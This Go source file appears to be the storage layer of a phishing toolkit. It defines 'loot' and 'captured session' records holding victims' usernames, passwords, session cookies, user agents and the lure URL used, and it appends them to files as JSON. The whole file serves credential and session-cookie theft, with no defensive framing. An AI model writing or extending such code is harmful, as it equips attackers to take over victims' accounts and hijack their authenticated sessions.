package main

import (
	"encoding/json"
	"io"
	"log"
	"sync"
	"time"
)

type DBLoginInfo struct {
	Username  string    `json:"username"`
	Password  string    `json:"password"`
	Date      time.Time `json:"date"`
	SessionID string    `json:"sid"`
	LureURL   string    `json:"lure_url"`
}
type CredsRepository interface {
	SaveCreds(info *DBLoginInfo) error
}

func NewFileLootRepository(credsFile io.Writer) CredsRepository {
	return &fileLootRepository{jsonSaver: &jsonSaver{file: credsFile}}
}

type fileLootRepository struct {
	jsonSaver *jsonSaver
}

func (r *fileLootRepository) SaveCreds(info *DBLoginInfo) (err error) {
	log.Println("dbInfo = ", info)
	return r.jsonSaver.SaveData(info)
}

type jsonSaver struct {
	file io.Writer
	mu   sync.Mutex
}

func (s *jsonSaver) SaveData(info interface{}) (err error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	data, err := json.Marshal(info)
	if err != nil {
		return err
	}
	if _, err = s.file.Write(data); err != nil {
		return
	}
	_, err = s.file.Write([]byte("\n"))
	return
}

type DBCapturedSession struct {
	Cookies   []*SessionCookie `json:"cookies"`
	SessionID string           `json:"sid"`
	LureURL   string           `json:"lure_url"`
	UserAgent string           `json:"user_agent"`
}

type SessionRepository interface {
	SaveSession(sess *DBCapturedSession) error
}

func NewFileSessionRepository(sessionFile io.Writer) SessionRepository {
	return &fileSessionRepository{jsonSaver: &jsonSaver{file: sessionFile}}
}

type fileSessionRepository struct {
	jsonSaver *jsonSaver
}

func (r *fileSessionRepository) SaveSession(sess *DBCapturedSession) error {
	return r.jsonSaver.SaveData(sess)
}
